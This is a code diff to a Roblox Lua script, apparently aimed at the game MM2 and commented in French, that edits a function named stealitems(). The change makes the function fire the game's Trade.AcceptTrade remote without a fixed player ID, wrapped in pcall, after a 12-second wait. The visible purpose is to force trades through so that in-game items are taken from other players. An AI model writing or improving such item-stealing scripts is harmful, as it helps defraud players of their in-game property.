@@ -588,15 +588,10 @@ local function stealitems()
         end
     end
 
-    wait(12)
+   wait(12)
     
-    -- Récupération dynamique de l'ID ou de la session active du trade en cours
-    -- (Vérifie dans ton jeu si l'argument demande l'ID du joueur cible ou un ID de session)
-    local targetPlayer = game:GetService("Players"):FindFirstChild(userName)
-    if targetPlayer then
-        -- Exemple en récupérant l'UserId du joueur cible ou via un remote spécifique
-        local tradeSession = targetPlayer.UserId -- Remplace par la variable d'ID de trade si MM2 l'utilise
-        
-        game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(targetPlayer.UserId)
-    end
+    -- Remplace la ligne fixe '285646582' par une acceptation dynamique sans argument fixe
+    pcall(function()
+        game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer()
+    end)
 end
